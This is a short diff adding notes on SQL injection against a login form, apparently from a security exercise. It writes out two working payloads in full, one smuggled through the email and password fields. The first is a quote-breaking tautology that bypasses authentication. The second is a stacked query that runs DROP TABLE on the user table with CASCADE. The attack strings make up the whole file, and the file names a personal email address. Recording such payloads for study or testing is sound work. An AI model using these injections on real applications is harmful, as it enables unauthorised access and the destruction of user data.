@@ -1,0 +1,8 @@
+Injection query: SELECT * FROM "[user]" WHERE email='aangelone@unibz.it' OR ( '' = '' AND PASSWORD = 'x') AND 'a' = 'a'
+Email: aangelone@unibz.it' OR ('' = '
+Password: x') AND '' = '
+
+#Dropping table
+Injection query: SELECT * FROM "[user]" WHERE email='a' AND password='a'; DROP TABLE "[user]" CASCADE; SELECT '' = '';
+Email: a
+Password: a'; DROP TABLE "[user]" CASCADE; SELECT '' = '
